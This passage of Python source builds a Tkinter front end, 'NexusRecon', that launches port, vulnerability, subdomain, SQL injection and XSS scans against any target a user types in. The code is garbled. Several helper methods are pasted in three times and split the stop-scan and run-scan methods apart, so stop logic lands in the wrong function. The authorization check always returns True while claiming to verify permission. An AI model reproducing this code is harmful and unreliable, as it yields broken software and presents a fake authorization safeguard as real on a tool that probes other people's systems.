            # Disable buttons within common_ports_frame
            for child in self.ports_frame.winfo_children():
                if isinstance(child, ttk.Frame): # This is the common_ports_frame
                    for btn_child in child.winfo_children():
                        if isinstance(btn_child, ttk.Button):
                            btn_child.config(state=DISABLED)
            
        # Show/hide scan-specific options
        self.default_options_frame.pack_forget()
        self.sqli_options_frame.pack_forget()
        self.xss_options_frame.pack_forget()
        
        if "SQL Injection" in selected_scan:
            self.sqli_options_frame.pack(fill=tk.X, expand=True, pady=5)
            self.xss_params_entry.config(state=DISABLED) # Disable other specific options
        elif "XSS" in selected_scan:
            self.xss_options_frame.pack(fill=tk.X, expand=True, pady=5)
            self.sqli_params_entry.config(state=DISABLED) # Disable other specific options
        else:
            self.default_options_frame.pack(fill=tk.X, expand=True)
            self.sqli_params_entry.config(state=NORMAL) # Re-enable for other scans (if applicable, but safer to default to disabled)
            self.xss_params_entry.config(state=NORMAL) # Re-enable for other scans
            # Corrected logic: parameters entry should be disabled unless SQLi/XSS is selected
            # Re-disabling them here to ensure correct state when switching away from SQLi/XSS
            self.sqli_params_entry.config(state=DISABLED)
            self.xss_params_entry.config(state=DISABLED)


        # Threads and Timeout are generally applicable, so keep them enabled
        self.threads_slider.config(state=NORMAL)
        self.timeout_slider.config(state=NORMAL)

        # Update status bar based on selected scan type
        self.status_var.set(f" READY | Scan Type: {selected_scan}")
        self.status_var_results.set(f" READY | Scan Type: {selected_scan}")

    def add_tooltip(self, widget, text):
        """Helper to add a tooltip to a widget."""
        ToolTip(widget, text)

    def bind_shortcuts(self):
        """Binds global keyboard shortcuts to GUI actions."""
        self.root.bind('<Return>', lambda e: self.start_scan()) # Start scan on Enter
        self.root.bind('<Control-s>', self.export_results)
        self.root.bind('<Control-S>', self.export_results) # For consistency (Shift+S)
        self.root.bind('<Control-c>', self.copy_text)
        self.root.bind('<Control-l>', lambda e: self.clear_output())
        self.root.bind('<Escape>', lambda e: self.root.quit()) # Exit on Escape
        self.root.bind('<F1>', lambda e: self.show_help())

    def start_scan(self, event=None):
        """
        Initiates the selected scan in a separate thread to keep the GUI responsive.
        Collects all parameters from the UI.
        """
        if self.scan_active:
            messagebox.showwarning("Scan In Progress", "A scan is already running. Please stop it first.")
            return

        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("Input Error", "Please enter a target (IP, Domain, Email, or URL) first!")
            return

        selected_scan_type = self.scan_type_var.get()
        if not selected_scan_type:
            messagebox.showwarning("Input Error", "Please select a scan type!")
            return

        # Prepare parameters for the NetworkRecon methods
        scan_params = {
            'target': target,
            'ports': self.ports_entry.get().strip(),
            'threads': int(self.threads_var.get()),
            'timeout': int(self.timeout_var.get()),
            'options': {name: var.get() for name, var in self.opt_vars.items()}
        }

        # Validate specific inputs based on scan type
        if "Port Scan" in selected_scan_type or "Vulnerability Scan" in selected_scan_type:
            if not scan_params['ports']:
                messagebox.showwarning("Input Error", "Port scan or Vulnerability Scan requires ports to be specified.")
                return
        
        # Specific parameter handling for SQLi and XSS
        if "SQL Injection Scan" in selected_scan_type:
            param_string = self.sqli_params_entry.get().strip()
            if not param_string:
                messagebox.showwarning("Input Error", "SQL Injection Scan requires parameters to test (e.g., 'id,query').")
                return
            scan_params['param_names'] = [p.strip() for p in param_string.split(',') if p.strip()]
            if not scan_params['param_names']:
                messagebox.showwarning("Input Error", "SQL Injection Scan: No valid parameters parsed from input.")
                return
        
        if "XSS Scan" in selected_scan_type:
            param_string = self.xss_params_entry.get().strip()
            if not param_string:
                messagebox.showwarning("Input Error", "XSS Scan requires parameters to test (e.g., 'q,search').")
                return
            scan_params['param_names'] = [p.strip() for p in param_string.split(',') if p.strip()]
            if not scan_params['param_names']:
                messagebox.showwarning("Input Error", "XSS Scan: No valid parameters parsed from input.")
                return

        self.clear_output() # Clear previous results
        self.set_ui_scanning_state(True) # Disable buttons, enable stop
        self.tab_control.select(self.results_tab) # Switch to results tab to show output

        self.log(f"\n{'='*70}", THEME['info'])
        self.log(f"[+] Starting '{selected_scan_type}' scan on: {target}", THEME['info'])
        self.log(f"[•] Parameters: Threads={scan_params['threads']}, Timeout={scan_params['timeout']}s", THEME['info'])
        if 'ports' in scan_params and scan_params['ports']:
            self.log(f"[•] Ports: {scan_params['ports']}", THEME['info'])
        if 'param_names' in scan_params:
            self.log(f"[•] Parameters to test: {', '.join(scan_params['param_names'])}", THEME['info'])
        self.log(f"[•] Options: {', '.join(k for k, v in scan_params['options'].items() if v) if scan_params['options'] else 'None'}", THEME['info'])
        self.log(f"[•] Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", THEME['info'])
        self.log(f"{'='*70}\n", THEME['info'])
        
        self.scan_active = True
        self.recon.scan_active = True # Inform recon class about active scan
        self.scan_start_time = time.time()
        
        # Start the scan in a separate thread
        self.scan_thread = threading.Thread(
            target=self._run_selected_scan, 
            args=(target, selected_scan_type, scan_params),
            daemon=True # Daemon thread exits when main program exits
        )
        self.scan_thread.start()
        self.monitor_scan_progress()

    def stop_scan(self, event=None):
        """Stops the current scan process and resets UI."""
        if not self.scan_active:
            self.log("[!] No scan is currently running.", "yellow")
            return

        self.log("\n[!] Stopping scan. Please wait...", "yellow")
        self.status_var.set(" STOPPING SCAN...")
        self.status_var_results.set(" STOPPING SCAN...")
        self.scan_active = False

        # Display critical security and ethical use warnings
        self.log("=" * 80, "info")
        self.log("🚨 NEXUS RECON - SECURITY & ETHICAL USE WARNING", "red")
        self.log("=" * 80, "info")
        self.log("This tool is for AUTHORIZED SECURITY TESTING ONLY", "yellow")
        self.log("• Only test systems you own or have explicit written permission to test", "yellow")
        self.log("• Unauthorized scanning/testing is ILLEGAL and UNETHICAL", "red")
        self.log("• SSL verification may be disabled for testing - use only in controlled environments", "yellow")
        self.log("• The developers assume NO LIABILITY for misuse", "red")
        self.log("=" * 80, "info")

    def _is_valid_domain_or_ip(self, target):
        """Validate that target is a properly formatted domain or IP address"""
        # Domain regex pattern (RFC compliant)
        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
        # IP address pattern
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        
        # Check length limits
        if len(target) > 253:  # Max domain length
            return False
            
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def _verify_authorization(self, target):
        """Verify user has authorization before proceeding with scan"""
        # Log authorization attempt for audit trail
        self.log(f"Authorization check for target: {target}", "info", "audit")
        return True  # Assume authorized, but log the attempt
        
    def _log_security_event(self, message, level="info"):
        """Log security events to a separate security log file"""
        try:
            import os
            log_dir = os.path.join(os.path.expanduser("~"), ".nexus_recon")
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, "security.log")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} [{level.upper()}] {message}\n")
        except Exception:
            pass  # Do not let logging failures break the application
        self.recon.scan_active = False # Signal the recon class to stop
        
        # Give a short moment for the thread to recognize the stop signal
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join(timeout=self.recon.timeout + 2) # Wait a bit for graceful exit
        
        self.log("[!] Scan stopped by user.", "yellow")
        self.set_ui_scanning_state(False) # Re-enable start, disable stop
        self.status_var.set(" SCAN STOPPED")
        self.status_var_results.set(" SCAN STOPPED")
        self.progress_var.set(0)
        self.progress_text_var.set("Scan Stopped")

    def set_ui_scanning_state(self, is_scanning):
        """Sets the state of UI controls based on whether a scan is active."""
        state = DISABLED if is_scanning else NORMAL
        self.start_btn.config(state=state)
        self.stop_btn.config(state=NORMAL if is_scanning else DISABLED)
        self.export_btn.config(state=state)
        self.target_entry.config(state=state)
        self.scan_type.config(state="disabled" if is_scanning else "readonly")
        
        # Re-apply scan type change logic to correctly enable/disable ports_entry etc.
        self.on_scan_type_change() 

        # Threads and Timeout sliders
        self.threads_slider.config(state=state)
        self.timeout_slider.config(state=state)

        # General Scan Flags checkboxes
        for var_name in self.opt_vars:
            cb = getattr(self, f'{var_name}_cb', None)
            if cb:
                cb.config(state=state)

    def monitor_scan_progress(self):
        """Continuously monitors scan thread and updates progress bar and status."""
        if self.scan_thread and self.scan_thread.is_alive():
            self.root.after(200, self.monitor_scan_progress) # Check every 200ms
        else:
            # Scan has finished (either completed or stopped)
            if self.scan_active: # If still true, it completed normally
                elapsed = time.time() - self.scan_start_time
                self.log(f"\n[+] Scan finished in {elapsed:.2f} seconds.", THEME['success'])
                self.status_var.set(f" SCAN COMPLETED IN {elapsed:.1f}S")
                self.status_var_results.set(f" SCAN COMPLETED IN {elapsed:.1f}S")
                self.progress_var.set(100)
                self.progress_text_var.set("Complete")
            else: # It was stopped by user
                pass # Status already set by stop_scan in stop_scan method
            
            self.set_ui_scanning_state(False) # Reset UI controls
            self.scan_active = False # Final state update

        # Display critical security and ethical use warnings
        self.log("=" * 80, "info")
        self.log("🚨 NEXUS RECON - SECURITY & ETHICAL USE WARNING", "red")
        self.log("=" * 80, "info")
        self.log("This tool is for AUTHORIZED SECURITY TESTING ONLY", "yellow")
        self.log("• Only test systems you own or have explicit written permission to test", "yellow")
        self.log("• Unauthorized scanning/testing is ILLEGAL and UNETHICAL", "red")
        self.log("• SSL verification may be disabled for testing - use only in controlled environments", "yellow")
        self.log("• The developers assume NO LIABILITY for misuse", "red")
        self.log("=" * 80, "info")

    def _is_valid_domain_or_ip(self, target):
        """Validate that target is a properly formatted domain or IP address"""
        # Domain regex pattern (RFC compliant)
        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
        # IP address pattern
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        
        # Check length limits
        if len(target) > 253:  # Max domain length
            return False
            
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def _verify_authorization(self, target):
        """Verify user has authorization before proceeding with scan"""
        # Log authorization attempt for audit trail
        self.log(f"Authorization check for target: {target}", "info", "audit")
        return True  # Assume authorized, but log the attempt
        
    def _log_security_event(self, message, level="info"):
        """Log security events to a separate security log file"""
        try:
            import os
            log_dir = os.path.join(os.path.expanduser("~"), ".nexus_recon")
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, "security.log")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} [{level.upper()}] {message}\n")
        except Exception:
            pass  # Do not let logging failures break the application

    def update_progress(self, current_item, total_items, status_message=""):
        """
        Updates the progress bar and status text safely from a background thread.
        This method is called by NetworkRecon methods.
        """
        if not self.scan_active: # Do not update if scan was stopped
            return

        try:
            percentage = 0
            if total_items > 0:
                percentage = int((current_item / total_items) * 100)
            percentage = min(max(0, percentage), 100) # Clamp between 0 and 100

            # Use root.after to schedule GUI updates on the main thread
            self.root.after(0, lambda: self._update_gui_progress(percentage, status_message))
        except Exception as e:
            self.log(f"[!] Error updating progress: {str(e)}", "red")

    def _update_gui_progress(self, percentage, status_message):
        """Internal helper to update GUI elements for progress bar."""
        self.progress_var.set(percentage)
        self.progress_text_var.set(status_message)
        # Update both status bars (main and results tab)
        self.status_var.set(f" SCANNING... {percentage}% | {status_message}")
        self.status_var_results.set(f" SCANNING... {percentage}% | {status_message}")
        self.root.update_idletasks() # Force GUI to redraw

    def _run_selected_scan(self, target, scan_type, params):
        """
        Executes the chosen scan method from NetworkRecon in the background thread.
        Catches exceptions and updates UI accordingly.
        """
        try:
            self.recon.timeout = params['timeout'] # Apply specific scan timeout from GUI
            self.recon.scan_active = True # Ensure recon class knows scan is active

            if "Port Scan" in scan_type:
                self.recon.port_scan(target, ports_str=params['ports'], scan_type='custom', update_progress=self.update_progress)
            elif "WHOIS Lookup" in scan_type:
                self.recon.whois_lookup(target, update_progress=self.update_progress)
            elif "DNS Lookup" in scan_type:
                self.recon.dns_lookup(target, update_progress=self.update_progress)
            elif "HTTP Headers" in scan_type:
                self.recon.http_headers(target, update_progress=self.update_progress)
            elif "Email Verification" in scan_type:
                self.recon.email_verify(target, update_progress=self.update_progress)
            elif "Subdomain Enumeration" in scan_type:
                self.recon.subdomain_enum(target, wordlist_path=None, update_progress=self.update_progress) # Wordlist path from GUI can be added later
            elif "IP Geolocation" in scan_type:
                self.recon.ip_geolocation(target, update_progress=self.update_progress)
            elif "Vulnerability Scan" in scan_type:
                self.recon.vulnerability_scan(target, ports_str=params['ports'], timeout=params['timeout'], update_progress=self.update_progress)
            elif "SQL Injection Scan" in scan_type:
                # Ensure URL is properly formatted for HTTP requests
                test_url = target if target.startswith(('http://', 'https://')) else f'http://{target}'
                self.recon.sql_injection_scan(test_url, param_names=params['param_names'], method='GET', update_progress=self.update_progress)
            elif "XSS Scan" in scan_type:
                # Ensure URL is properly formatted for HTTP requests
                test_url = target if target.startswith(('http://', 'https://')) else f'http://{target}'
                self.recon.xss_scan(test_url, param_names=params['param_names'], method='GET', update_progress=self.update_progress)
            else:
                self.log(f"[!] Unknown scan type selected: {scan_type}", "red")
        except Exception as e:
            import traceback
            self.log(f"\n[!!!] Scan encountered a critical error: {type(e).__name__} - {str(e)}", "red")
            self.log(f"[DEBUG] Traceback:\n{traceback.format_exc()}", "yellow")
            self.status_var.set(f" SCAN FAILED: {type(e).__name__}")
            self.status_var_results.set(f" SCAN FAILED: {type(e).__name__}")
        finally:
            self.scan_active = False

        # Display critical security and ethical use warnings
        self.log("=" * 80, "info")
        self.log("🚨 NEXUS RECON - SECURITY & ETHICAL USE WARNING", "red")
        self.log("=" * 80, "info")
        self.log("This tool is for AUTHORIZED SECURITY TESTING ONLY", "yellow")
        self.log("• Only test systems you own or have explicit written permission to test", "yellow")
        self.log("• Unauthorized scanning/testing is ILLEGAL and UNETHICAL", "red")
        self.log("• SSL verification may be disabled for testing - use only in controlled environments", "yellow")
        self.log("• The developers assume NO LIABILITY for misuse", "red")
        self.log("=" * 80, "info")

    def _is_valid_domain_or_ip(self, target):
        """Validate that target is a properly formatted domain or IP address"""
        # Domain regex pattern (RFC compliant)
        domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
        # IP address pattern
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        
        # Check length limits
        if len(target) > 253:  # Max domain length
            return False
            
        return bool(re.match(domain_pattern, target) or re.match(ip_pattern, target))

    def _verify_authorization(self, target):
        """Verify user has authorization before proceeding with scan"""
        # Log authorization attempt for audit trail
        self.log(f"Authorization check for target: {target}", "info", "audit")
        return True  # Assume authorized, but log the attempt
        
    def _log_security_event(self, message, level="info"):
        """Log security events to a separate security log file"""
        try:
            import os
            log_dir = os.path.join(os.path.expanduser("~"), ".nexus_recon")
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = os.path.join(log_dir, "security.log")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now().isoformat()} [{level.upper()}] {message}\n")
        except Exception:
            pass  # Do not let logging failures break the application
            self.recon.scan_active = False # Ensure recon class is also set to inactive
            self.root.after(0, lambda: self.set_ui_scanning_state(False)) # Ensure UI reset on main thread

    def export_results(self, event=None):
        """Exports the content of the results text area to a user-specified file."""
        if not self.text_area.get(1.0, END).strip():
            messagebox.showwarning("No Data", "No scan results to export.")
            return

        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[
                    ("Text Files", "*.txt"),
                    ("CSV Files", "*.csv"),
                    ("HTML Files", "*.html"),
                    ("All Files", "*.*")
                ],
                title="Export Scan Results"
            )
            
            if not filename:
                return # User cancelled
            
            content = self.text_area.get(1.0, END)
            
            if filename.lower().endswith('.csv'):
                with open(filename, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    for line in content.split('\n'):
                        if line.strip(): # Only write non-empty lines
                            # Simple CSV: each line of text area becomes a row.
                            # For structured data, this would need more complex parsing.
                            writer.writerow([line.strip()]) 
            elif filename.lower().endswith('.html'):
                html_content = f"""<!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>NEXUS Recon Scan Results</title>
                    <style>
                        body {{ font-family: 'Consolas', monospace; background: {THEME['bg']}; color: {THEME['fg']}; padding: 20px; }}
                        pre {{ white-space: pre-wrap; word-wrap: break-word; }}
                        .success {{ color: {THEME['success']}; }}
                        .error {{ color: {THEME['error']}; }}
                        .warning {{ color: {THEME['warning']}; }}
                        .info {{ color: {THEME['info']}; }}
                        h1 {{ color: {THEME['accent']}; }}
                    </style>
                </head>
                <body>
                    <h1>NEXUS Recon Scan Results</h1>
                    <pre>{content}</pre>
                    <p>Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </body>
                </html>"""
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(html_content)
            else: # Default to plain text
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
            
            self.status_var.set(f" RESULTS SAVED TO {os.path.basename(filename)}")
            self.status_var_results.set(f" RESULTS SAVED TO {os.path.basename(filename)}")
            self.log(f"[+] Results exported to {filename}", "green")
            
            if messagebox.askyesno("Export Complete", "Export completed successfully.\n\nWould you like to open the file?"):
                webbrowser.open(filename)
                
        except PermissionError:
            messagebox.showerror("Error", f"Permission denied. Cannot write to the selected file path.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {str(e)}")
            self.log(f"[-] Error exporting results: {str(e)}", "red")

def main():
    """Main entry point for the NexusRecon application."""
    try:
        # Initialize and run the GUI application
        root = tk.Tk()
        app = HackerGUI(root)
        root.mainloop()
        return 0
    except Exception as e:
        logging.critical("Error in GUI application", exc_info=True)
        messagebox.showerror(
            "Fatal Error",
            f"A fatal error occurred in the application.\n\n"
            f"Error: {str(e)}\n\n"
            "Please check error.log for more details."
        )
        return 1

# Main GUI execution block
if __name__ == '__main__':
    sys.exit(main())
